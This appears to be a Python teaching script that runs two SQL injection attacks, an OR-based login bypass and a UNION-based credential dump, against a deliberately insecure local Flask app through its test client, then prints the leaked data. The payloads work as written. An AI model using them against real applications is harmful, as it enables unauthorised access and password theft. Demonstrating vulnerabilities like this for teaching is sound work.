"""
Automated demonstration of the SQL injection vulnerabilities.

Run with `python test_injections.py`. The script spins up Flask's test client,
performs both attacks, and prints the leaked data so you can compare it with
the safe behaviour.
"""

import re
import urllib.parse

from insecure_app import create_app


def extract_queries(html: str):
    """Pull the recorded SQL queries out of the rendered HTML."""
    candidates = re.findall(r"<code>(.*?)</code>", html, flags=re.DOTALL)
    return [item for item in candidates if "select" in item.lower()]


def demonstrate_login_bypass(client):
    print("[*] Attempting login bypass using OR-based injection...")
    payload = {"username": "ghost", "password": "' OR '1'='1"}
    response = client.post("/login", data=payload, follow_redirects=True)

    html = response.get_data(as_text=True)
    queries = extract_queries(html)

    succeeded = "Welcome back" in html
    print("    Success:", succeeded)
    for query in queries:
        print("    Query:", query)

    return succeeded


def demonstrate_union_leak(client):
    print("[*] Attempting UNION-based data exfiltration...")
    payload = "' UNION SELECT username, password FROM users --"
    encoded = urllib.parse.quote(payload, safe="")
    response = client.get(f"/search?q={encoded}")

    html = response.get_data(as_text=True)
    queries = extract_queries(html)
    leaked = "supersecret" in html

    print("    Leaked credentials:", leaked)
    for query in queries:
        print("    Query:", query)

    return leaked


def main():
    app = create_app({"TESTING": True})
    client = app.test_client()

    login_ok = demonstrate_login_bypass(client)
    union_ok = demonstrate_union_leak(client)

    if login_ok and union_ok:
        print("\n[+] Both vulnerabilities were successfully exploited.")
    else:
        print("\n[-] Something went wrong detecting the injections.")


if __name__ == "__main__":
    main()
